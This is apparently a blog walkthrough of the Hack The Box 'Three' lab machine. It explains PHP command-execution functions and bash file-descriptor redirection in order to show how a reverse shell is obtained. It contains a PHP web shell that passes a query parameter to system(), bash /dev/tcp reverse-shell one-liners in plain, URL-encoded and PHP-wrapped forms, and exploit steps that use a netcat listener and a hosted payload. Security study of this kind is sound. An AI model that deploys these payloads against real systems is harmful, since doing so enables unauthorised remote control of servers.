---
title: 'Obtain a Reverse Shell With PHP and Bash'
description: 'A summary of how to obtain a reverse shell using basic PHP and Bash commands based on HTB Starting Point Tier 1 box "Three"'
pubDate: 'Dec 5 2024'
heroImage: 'blog-placeholder-5.jpg'
---

## Obtain a reverse shell by arbitrary command execution in PHP

This article is a high-level summary of the `Three` challenge in HTB Starting Point Tier 1. It covers some basics of the tech involved to help build up an understanding of why the reverse shell exploit works. 

### PHP File
**PHP Script**  
PHP is a general purpose scripting language that can be used to make server-side rendered websites or CLI scripts. A PHP script gets straight into the action by wrapping its code in the `<?php ... ?>` tag. Alternatively, PHP lends itself to web development because a PHP file can simply be a HTML file with an embedded PHP script:
```html
...
<body>
    <?php 
        echo "Hello world";
    ?>
</body>
...
```

**Variables**  
* Variables can be accessed using `$`, e.g. `$myVar`. 
* Global variables can be specified by declaring `global $myVar`
* [Superglobal variables](https://www.php.net/manual/en/language.variables.superglobals.php) exist in every scope throughout a script, such as `$_SERVER`, `$_GET`, `$_POST`, `$_COOKIE`, and a few more. This contains some interesting stuff. I should read up more on this for the future.

**Accessing Query Parameters: `$_GET`, `$_POST`**  
The `$_GET` superglobal contains an associative array (i.e. basically a dictionary) of all URL query parameters passed by a request as seen in the following example. (N.b. `htmlspecialchars` performs HTML encoding so the value is properly rendered on the page).
```php
// $ curl http://example.com?name=Hannes
<?php
    echo htmlspecialchars($_GET["name"]);
?>
```

`$_POST` is very similar, and is used to retrieve variables submitted on a HTTP POST when the content type is `application/x-www-form-urlencoded` or `multipart/form-data`.


**Command Execution**  
PHP can do a lot of things. One such thing is execute commands. There are a few functions that can achieve this in PHP. [This Stack Overflow answer](https://stackoverflow.com/a/39681338) provides a good summary of such commands:

```php
+----------------+-----------------+----------------+----------------+
|    Command     | Displays Output | Can Get Output | Gets Exit Code |
+----------------+-----------------+----------------+----------------+
| system()       | Yes (as text)   | Last line only | Yes            |
| passthru()     | Yes (raw)       | No             | Yes            |
| exec()         | No              | Yes (array)    | Yes            |
| shell_exec()   | No              | Yes (string)   | No             |
| backticks (``) | No              | Yes (string)   | No             |
+----------------+-----------------+----------------+----------------+
```

From the above, `system()` seems like a useful command to be able to execute a command and see the output streamed to the browser or wherever the output is being displayed. Based on all of the above information, it seems we can write a PHP file that will take in a URL query param and execute the command on the server:

```php
<?php
    system($_GET["cmd"]);
?>
```

N.b. after doing some more research, it seems that in other approaches, the `exec()` function is preferred

**Reverse Shell**  
Given all of the above, it seems possible that a reverse shell payload could be written entirely in PHP without the need for a bash script and the need to host the payload somewhere. (I while qualify that statement by saying sometimes it may be useful and perhaps preferred to do such a thing). 

Potential solution number 1 would be put the bash payload in the `cmd` query param. Option number 2 would be to include all of the bash payload in the PHP script, like so:
```php
// Option 1:
// curl http://example.com?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F%3CIP%3E%2F1337%200%3E%261

// Option 2:
<?php 
    system("bash -i >& /dev/tcp/<IP>/1337 0>&1")
?>
```

N.b. after doing some more reading online, it seems preferable to change the script. `exec()` may be more flexible for additional scripting. Furthermore, it is preferred to add the `/bin/bash -c` prefix to ensure the command runs in bash. Here is the updated script:
```php
<?php
    exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP/1337> 0>&1'");
?>
```

There are certainly further options to create a reverse shell in bash. It seems the simple way is to execute a system command.


### Bash script
```bash
bash -i >& /dev/tcp/<IP/1337> 0>&1
```

Reading the [bash manpage](https://www.gnu.org/software/bash/manual/bash.html#Redirections) and looking through some [StackOverflow](https://stackoverflow.com/a/11255498) posts, here is some bonus learning on file descriptor redirects in bash:
* `>` "clobbers" the file (removes the pre-existing content and writes the output of the preceding command to it)
* `&` is used in file descriptor redirections. It is commonly seen in the form `&>` or `>&` (both are equivalent, though the first is preferred) to redirect stdout and stderr to the same location. It is equivalent to `>word 2>&1`. They are probably interchangeable because of some computer history where the latter option was the preferred redirection syntax.

Therefore, going back to the description mentioned in the task: 
* `-i` makes bash interactive
* `>&` redirects stdout and stderr to the proceeding location. i.e. `>& <file>`
* `0>&1` redirects stdin to come from same location as stdout
* `/dev/tcp/<ip>/<port>` is a special file to allow raw TCP connections

So the script is writing all stdin, stdout and stderr of an interactive bash shell to the tcp connection specified. Based on my understanding, the redirection of stdin to the tcp connection isn't necessary, but is useful for us as an attacker to identify what command is being executed on the server (e.g. for debugging purposes).


### Exploit
Bringing together all of the above elements, the exploit was executed by:
1. Obtaining arbitrary command execution via a php script
2. Creating a bash script that would write all its stdin, stdout and stderr content to a tcp connection to our machine
3. Setting up a listener on our device using netcat
4. Setting up a http server to serve the reverse-shell bash script
5. Invoking the bad php page to retrieve and execute the bash script (via a curl request)